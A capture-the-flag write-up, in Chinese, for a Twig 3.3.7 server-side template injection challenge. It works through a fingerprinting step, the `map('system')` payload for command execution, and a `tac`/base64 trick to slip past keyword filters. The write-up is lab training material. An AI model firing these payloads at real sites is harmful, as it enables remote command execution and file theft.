# SecurityCenter

## 题目简述

站点的 `/vendor/composer/installed.json` 可公开访问，其中显示服务使用 `twig/twig 3.3.7`。`redirect.php` 把查询参数 `url` 直接拼入 Twig 模板，导致服务端模板注入；题目另外过滤了 `cat` 和明文 `flag`，需要换用其他命令并编码输出。

## 解题过程

先访问 Composer 清单确认模板引擎，再对 `url` 参数做无害运算测试：

```text
/redirect.php?url={{10-1}}
```

页面显示 `9`，证明输入会被 Twig 求值，而不是作为普通文本转义。

Twig 的 `map` 过滤器允许以函数名处理数组元素。传入 `system` 后，数组中的字符串会成为系统命令：

```twig
{{ ["whoami"] | map("system") }}
```

页面输出 `www-data`，确认已经取得命令执行。直接使用 `cat /flag` 会命中过滤器，flag 明文也不能直接出现在响应中，因此改用 `tac` 读取并通过 Base64 转换：

```twig
{{ ["tac /flag | base64"] | map("system") }}
```

发送请求时应让客户端负责 URL 编码，避免花括号、引号和管道符被错误解释：

```bash
curl --get \
  --data-urlencode 'url={{["tac /flag | base64"]|map("system")}}' \
  'http://example.invalid/redirect.php'
```

原题响应中命令输出后还跟着 Twig 对数组的显示文本 `Array`。去掉该单词，只取 Base64 部分：

```text
aGdhbWV7IVR3MTktUzVOMX4xc15zMDBPME9faW50ZXJlc3QxbjV+IX0K
```

解码：

```bash
printf '%s' 'aGdhbWV7IVR3MTktUzVOMX4xc15zMDBPME9faW50ZXJlc3QxbjV+IX0K' | base64 -d
```

得到：

```text
hgame{!Tw19-S5N1~1s^s00O0O_interest1n5~!}
```

## 方法总结

Composer 清单泄露提供了模板引擎指纹，算术表达式则闭合验证了 SSTI。Twig 的 `map("system")` 把模板求值提升为命令执行。面对关键字与回显过滤，不必继续寻找同义模板语法；换用 `tac` 绕过命令名过滤，再用 Base64 让敏感明文不直接经过响应过滤器即可。
